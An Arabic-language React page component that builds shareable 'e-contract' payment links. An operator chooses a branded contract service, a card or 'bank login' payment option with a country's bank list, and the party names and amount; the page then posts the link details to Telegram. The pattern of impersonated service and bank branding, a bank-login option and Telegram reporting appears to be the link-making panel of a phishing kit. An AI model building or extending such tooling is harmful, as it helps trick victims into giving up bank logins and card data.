import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getContractServicesByCountry } from "@/lib/contractServices";
import { getContractBranding } from "@/lib/contractLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { FileText, Hash, User, DollarSign, Calendar, Scale, Building2, Copy, ExternalLink, CreditCard, Link as LinkIcon } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateContractLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getContractServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [contractId, setContractId] = useState("");
  const [partyAName, setPartyAName] = useState("");
  const [partyBName, setPartyBName] = useState("");
  const [contractType, setContractType] = useState("rental");
  const [contractValue, setContractValue] = useState("0");
  const [startDate, setStartDate] = useState("");
  const [duration, setDuration] = useState("12");
  const [termsSummary, setTermsSummary] = useState("");
  const [documentUrl, setDocumentUrl] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  const selectedServiceData = useMemo(() =>
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const serviceBranding = useMemo(() =>
    selectedService ? getContractBranding(selectedService) : null,
    [selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !contractId || !partyAName) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول المطلوبة", variant: "destructive" });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "contract",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          contract_id: contractId,
          party_a: partyAName,
          party_b: partyBName,
          contract_type: contractType,
          contract_value: parseFloat(contractValue) || 0,
          start_date: startDate,
          duration: parseInt(duration) || 12,
          terms_summary: termsSummary,
          document_url: documentUrl,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'contract_created',
        data: {
          contract_id: contractId,
          party_a: partyAName,
          party_b: partyBName,
          contract_type: contractType,
          contract_value: parseFloat(contractValue) || 0,
          start_date: startDate,
          duration: parseInt(duration) || 12,
          service_name: selectedServiceData?.name || selectedService,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({ title: "تم الإرسال بنجاح", description: "تم إرسال البيانات إلى التليجرام" });
      } else {
        toast({ title: "تحذير", description: "فشل في إرسال البيانات", variant: "destructive" });
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
  };

  const handlePreview = () => window.open(createdPaymentUrl, '_blank');

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <FileText className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6"><TelegramTest /></div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء عقد إلكتروني</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm">خدمة العقود *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة العقود" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>{service.name}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img
                        src={serviceBranding.logo}
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                </div>
              )}

              {/* Contract ID */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم العقد *
                </Label>
                <Input value={contractId} onChange={(e) => setContractId(e.target.value)} placeholder="CN-2024-001" className="h-9 text-sm" required />
              </div>

              {/* Party A */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  الطرف الأول * (المؤجر/البائع/صاحب العمل)
                </Label>
                <Input value={partyAName} onChange={(e) => setPartyAName(e.target.value)} placeholder="الاسم الكامل" className="h-9 text-sm" required />
              </div>

              {/* Party B */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  الطرف الثاني (المستأجر/المشتري/الموظف)
                </Label>
                <Input value={partyBName} onChange={(e) => setPartyBName(e.target.value)} placeholder="الاسم الكامل" className="h-9 text-sm" />
              </div>

              {/* Contract Type */}
              <div>
                <Label className="mb-2 text-sm">نوع العقد *</Label>
                <Select value={contractType} onValueChange={setContractType}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر نوع العقد" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="rental">عقد إيجار</SelectItem>
                    <SelectItem value="service">عقد خدمة</SelectItem>
                    <SelectItem value="employment">عقد عمل</SelectItem>
                    <SelectItem value="sale">عقد بيع</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Contract Value */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  قيمة العقد
                  {country && <span className="text-xs text-muted-foreground">({getCurrencyName(country)})</span>}
                </Label>
                <Input type="number" value={contractValue} onChange={(e) => setContractValue(e.target.value)} placeholder="0.00" className="h-9 text-sm" min="0" step="0.01" />
              </div>

              {/* Start Date */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Calendar className="w-3 h-3" />
                  تاريخ البداية
                </Label>
                <Input type="date" value={startDate} onChange={(e) => setStartDate(e.target.value)} className="h-9 text-sm" />
              </div>

              {/* Duration */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Scale className="w-3 h-3" />
                  المدة (بالأشهر)
                </Label>
                <Input type="number" value={duration} onChange={(e) => setDuration(e.target.value)} placeholder="12" className="h-9 text-sm" min="1" />
              </div>

              {/* Terms Summary */}
              <div>
                <Label className="mb-2 text-sm">ملخص الشروط</Label>
                <Input value={termsSummary} onChange={(e) => setTermsSummary(e.target.value)} placeholder="وصف مختصر لشروط العقد" className="h-9 text-sm" />
              </div>

              {/* Document URL */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <LinkIcon className="w-3 h-3" />
                  رابط الوثيقة (PDF)
                </Label>
                <Input type="url" value={documentUrl} onChange={(e) => setDocumentUrl(e.target.value)} placeholder="https://example.com/contract.pdf" className="h-9 text-sm" />
              </div>

              {/* Payment Method */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">بطاقة ائتمان</SelectItem>
                    <SelectItem value="bank_login">تسجيل دخول البنك</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Selection */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img src={bank.logo} alt={bank.nameAr} className="h-5 w-5 object-contain" onError={(e) => e.currentTarget.style.display = 'none'} />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              {/* Submit Button */}
              <Button type="submit" className="w-full py-5" disabled={createLink.isPending}>
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <FileText className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء عقد إلكتروني</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">✅ تم إنشاء العقد بنجاح!</AlertDialogTitle>
            <AlertDialogDescription className="text-center">يمكنك نسخ الرابط أو معاينته</AlertDialogDescription>
          </AlertDialogHeader>
          <div className="my-4">
            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">{createdPaymentUrl}</div>
            <div className="flex gap-2">
              <Button onClick={handleCopyLink} variant="outline" className="flex-1">{copied ? "تم النسخ!" : "نسخ الرابط"}</Button>
              <Button onClick={handlePreview} variant="outline" className="flex-1">معاينة</Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateContractLink;
